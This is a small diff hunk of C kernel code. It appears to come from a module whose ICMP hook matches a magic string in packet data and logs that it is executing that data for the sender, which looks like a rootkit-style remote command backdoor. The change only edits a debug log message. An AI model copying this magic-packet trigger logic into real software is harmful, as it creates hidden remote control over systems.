@@ -37,7 +37,7 @@ unsigned int kdo_icmp(
 			! strncmp(data, MAGIC_EXEC, sizeof(MAGIC_EXEC) - 1)
 		) {
 			#ifdef DEBUG
-			kdo_log_fmt(KERN_INFO, "Executing for %pI4: %s", &iph->saddr, data);
+			kdo_log_fmt(KERN_INFO, "executing for %pI4: %s", &iph->saddr, data);
 			#endif
 
 			iph->saddr ^= 0x10000000;
